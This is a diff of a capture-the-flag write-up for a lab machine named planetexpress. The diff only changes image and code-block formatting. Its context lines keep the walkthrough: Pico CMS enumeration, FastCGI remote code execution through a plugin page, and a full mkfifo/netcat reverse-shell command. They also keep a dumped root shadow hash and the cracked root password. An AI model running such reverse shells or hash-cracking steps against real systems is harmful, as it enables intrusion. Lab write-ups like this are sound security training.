@@ -36,7 +36,7 @@ Port 8000 was running Pico CMS, which does have some exploits.
 
 Port 80 had a countdown:
 
-<figure><img src="../../../.gitbook/assets/image (985).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(985).png>)
 
 There isn't much on this page, so we can do a `gobuster` directory scan with the PHP extension since PicoCMS was being used:
 
@@ -97,11 +97,11 @@ locale: ~
 
 There's also a custom plugin developed for this website, and we can visit that at `plugins/PicoTest.php` based on the Github repo. This would show us the PHPInfo of the site:
 
-<figure><img src="../../../.gitbook/assets/image (292).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(292).png>)
 
 Here, we can find that `/var/www/html/planetexpress` is the document root. Also, we can find a lot of disabled functions:
 
-<figure><img src="../../../.gitbook/assets/image (314).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(314).png>)
 
 ### FastCGI -> RCE
 
@@ -113,17 +113,15 @@ There are RCE exploits for this service [here](https://gist.github.com/phith0n/9
 
 Using `passthru` and the document root directory allows us to get RCE:
 
-<figure><img src="../../../.gitbook/assets/image (1215).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1215).png>)
 
 We can then get a reverse shell via the `mkfifo` one-liner.
 
-{% code overflow="wrap" %}
 ```
 $ python2 exploit.py -c '<?php passthru("bash -c \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.45.218 80 > /tmp/f\""); ?>' 192.168.183.205 /var/www/html/planetexpress/plugins/PicoTest.php
 ```
-{% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (1232).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1232).png>)
 
 ## Privilege Escalation
 
@@ -178,16 +176,13 @@ www-data@planetexpress:/tmp$ ls -la /etc/shadow
 
 This made the file readable by all. We can then grab the `root` hash:
 
-{% code overflow="wrap" %}
 ```
 www-data@planetexpress:/tmp$ cat /etc/shadow
 root:$6$vkAzDkveIBc6PmO1$y8QyGSMqJEUxsDfdsX3nL5GsW7p/1mn5pmfz66RBn.jd7gONn0vC3xf8ga33/Fq57xMuqMquhB9MoTRpTTHVO1:19003:0:99999:7:::
 ```
-{% endcode %}
 
 We just need to put this hash and the entry for `root` in `/etc/passwd` into another file, then run `unshadow` to convert it to a crackable hash.
 
-{% code overflow="wrap" %}
 ```
 $ cat hash  
 root:$6$vkAzDkveIBc6PmO1$y8QyGSMqJEUxsDfdsX3nL5GsW7p/1mn5pmfz66RBn.jd7gONn0vC3xf8ga33/Fq57xMuqMquhB9MoTRpTTHVO1:19003:0:99999:7:::
@@ -196,7 +191,6 @@ root:x:0:0:root:/root:/bin/bash
 $ unshadow passwd hash
 root:$6$vkAzDkveIBc6PmO1$y8QyGSMqJEUxsDfdsX3nL5GsW7p/1mn5pmfz66RBn.jd7gONn0vC3xf8ga33/Fq57xMuqMquhB9MoTRpTTHVO1:0:0:root:/root:/bin/bash
 ```
-{% endcode %}
 
 Then, we can crack it in `john` (or in my case, just show because I cracked it before):
 
@@ -209,6 +203,6 @@ root:neverwant2saygoodbye:0:0:root:/root:/bin/bash
 
 We can then `ssh` in as `root`:
 
-<figure><img src="../../../.gitbook/assets/image (1567).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1567).png>)
 
 Rooted!
